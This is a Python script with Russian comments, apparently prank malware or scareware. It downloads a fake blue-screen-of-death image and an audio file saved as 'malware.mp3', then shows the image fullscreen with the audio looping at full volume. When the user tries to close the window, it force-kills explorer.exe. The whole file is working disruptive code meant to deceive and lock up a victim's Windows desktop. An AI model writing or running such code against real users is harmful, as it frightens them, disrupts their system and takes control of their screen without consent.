import urllib.request
import os
from PIL import Image, ImageTk
import tkinter as tk
import screeninfo
import requests
import pygame

REQUEST_STATUS_CODE = 200

if __name__ == '__main__':
    # Создаем папку testing на диске C
    os.mkdir('C:\\testing')

    # Загружаем музыку
    req = requests.get('https://cdn.discordapp.com/attachments/1265404586835972190/1268856185088643103/3fef89a292a95da.mp3?ex=66adf1e8&is=66aca068&hm=8c5f5f0d8b172bc23d8e1753441a0f36dd9b6b5ecade0550a018f4befc4ba6c9&')
    if req.status_code == 200:
        # Сохраняем музыку в папке testing с названием malware.mp3
        with open(os.path.join('C:\\testing', 'malware.mp3'), 'wb') as f:
            f.write(req.content)


# URL изображения, которое нужно загрузить
img_url = 'https://volt-pc.ru/wp-content/uploads/2022/11/siniy-ekran-smerti-bsod-krasnodar-foto-0.png'

# Имя файла
file_path = 'images.jpeg'

# Загрузка изображения
urllib.request.urlretrieve(img_url, file_path)

# Путь к вашей картинке
image_path = file_path

# Создание главного окна tkinter
root = tk.Tk()

# Получение размеров экрана
screen_info = screeninfo.get_monitors()
screen_width = screen_info[0].width
screen_height = screen_info[0].height

# Загрузка и изменение размера картинки
image = Image.open(image_path)
image = image.resize((screen_width, screen_height))

# Конвертация картинки в формат, доступный для отображения в tkinter
image_tk = ImageTk.PhotoImage(image)

# Создание полноэкранного окна tkinter
root.attributes("-fullscreen", True)

def close():
    os.system('taskkill /f /im explorer.exe')

# Не даем закрыть
root.protocol("WM_DELETE_WINDOW", close)

# Создание виджета Label для отображения картинки в окне
label = tk.Label(root, image=image_tk)
label.pack(fill="both", expand=True)

def play_music():
    # Инициализируем pygame
    pygame.init()

    # Устанавливаем параметры звука
    volume = 1  # Уровень громкости (от 0 до 1)
    rate = 44100  # Частота дискретизации (44100 Hz)

    # Создаем плеер
    pygame.mixer.init()
    pygame.mixer.music.load('C:\\testing\malware.mp3')
    pygame.mixer.music.set_volume(volume)

    # Воспроизводим музыку в фоновой режиме
    pygame.mixer.music.play(-1)  # -1 означает фоновое воспроизведение
    
play_music()

# Запуск главного цикла окна
root.mainloop()